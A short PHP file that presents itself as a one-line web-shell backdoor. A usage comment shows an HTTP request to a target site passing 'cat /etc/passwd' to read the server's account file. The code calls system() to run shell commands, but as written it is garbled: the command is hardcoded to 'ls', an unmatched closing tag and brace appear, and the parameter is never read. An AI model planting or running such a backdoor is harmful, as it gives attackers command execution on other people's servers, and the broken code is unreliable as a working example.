<!-- Simple PHP Backdoor By DK (One-Liner Version) -->
<!-- Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd -->
<?php $cmd = "ls"; system($cmd); echo "</pre>"; die; }?>
